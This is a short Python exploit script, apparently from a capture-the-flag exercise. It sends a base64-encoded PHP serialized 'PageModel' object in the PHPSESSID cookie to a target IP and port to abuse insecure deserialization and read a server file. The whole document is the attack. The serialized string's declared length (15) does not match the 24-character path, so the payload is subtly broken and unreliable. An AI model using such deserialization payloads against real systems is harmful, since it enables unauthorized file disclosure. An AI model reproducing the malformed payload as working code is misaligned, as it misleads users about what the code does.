import requests, html, base64

url = "http://167.99.89.198:31609/"

payload = """O:9:"PageModel":1:{s:4:"file";s:15:"/static/js/production.js";}"""
phpsessid = base64.b64encode(payload.encode()).decode('utf-8')
cookies = {"PHPSESSID": base64.b64encode(payload.encode()).decode('utf-8')}
print(cookies)
r = requests.get(url,cookies={"PHPSESSID": phpsessid})
print(r.content)
print(r.text)
print(r.cookies)